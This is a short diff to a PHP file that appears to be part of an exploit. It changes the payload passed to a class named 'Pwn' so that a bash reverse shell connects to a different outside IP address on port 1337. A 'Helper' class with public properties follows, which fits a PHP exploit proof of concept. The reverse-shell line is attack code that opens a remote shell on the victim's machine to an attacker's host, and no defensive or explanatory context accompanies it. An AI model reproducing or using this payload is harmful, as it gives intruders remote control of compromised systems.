@@ -1,5 +1,5 @@
 <?php
-new Pwn('bash -i >& /dev/tcp/138.197.143.92/1337 0>&1');
+new Pwn('bash -i >& /dev/tcp/192.3.88.168/1337 0>&1');
 
 class Helper { public $a, $b, $c; }
 class Pwn {
